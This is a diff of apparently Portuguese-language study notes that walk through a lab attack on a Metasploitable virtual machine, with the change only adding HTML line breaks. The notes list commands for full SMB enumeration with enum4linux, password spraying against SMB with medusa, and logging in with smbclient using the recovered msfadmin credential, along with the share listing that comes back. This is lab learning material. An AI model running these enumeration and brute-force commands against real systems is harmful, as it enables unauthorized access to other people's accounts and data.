@@ -65,24 +65,23 @@ medusa -M http -q
 
 utilizando o enum4linux para ataque via SMB (compartilha arquivos entre Windows e linux)
 
-enum4linux -a 192.168.56.102 | tee enum4_output.txt
-[parâmetro -a informa para tentar todas as técnicas de enumeração possíveis]
-[Depois da barrinha em pe o comando <b>tee</b> mostra na tela e salva em arquivo .txt]
-Testanto como medusa
-medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
-agora testando o que se encontrou
-smbclient -L //192.168.56.102 -U msfadmin
-Password for [WORKGROUP\msfadmin]: você digita a senha encontrada msfadmin e ele mostra os compartilhamentos
-tipo:
-
-Sharename	Type	Comment
-print$		disk	Pinter drivers
-tmp		disk	oh noes”
-opt		disk
-IPC$		IPC	IPC Service (metasploitable server (Samba 3.0.20-Debian)) 
-ADMIN$	IPC	IPC Service (metasploitable server (Samba 3.0.20-Debian))
-Msfadmin	disk	Home Directories
-Reconnecting with SMB1 for workgroup listing.
-Server      	Comment
-Workgroup	Master
-WORKGROUP	METASPLOITABLE
+enum4linux -a 192.168.56.102 | tee enum4_output.txt<br>
+[parâmetro -a informa para tentar todas as técnicas de enumeração possíveis]<br>
+[Depois da barrinha em pe o comando <b>tee</b> mostra na tela e salva em arquivo .txt]<br>
+Testanto como medusa<br>
+medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50<br>
+agora testando o que se encontrou<br>
+smbclient -L //192.168.56.102 -U msfadmin<br>
+Password for [WORKGROUP\msfadmin]: você digita a senha encontrada msfadmin e ele mostra os compartilhamentos<br>
+tipo:<br><br>
+Sharename	Type	Comment<br>
+print$		disk	Pinter drivers<br>
+tmp		disk	oh noes”<br>
+opt		disk<br>
+IPC$		IPC	IPC Service (metasploitable server (Samba 3.0.20-Debian))<br>
+ADMIN$	IPC	IPC Service (metasploitable server (Samba 3.0.20-Debian))<br>
+Msfadmin	disk	Home Directories<br>
+Reconnecting with SMB1 for workgroup listing.<br>
+Server      	Comment<br><br>
+Workgroup	    Master<br>
+WORKGROUP	    METASPLOITABLE
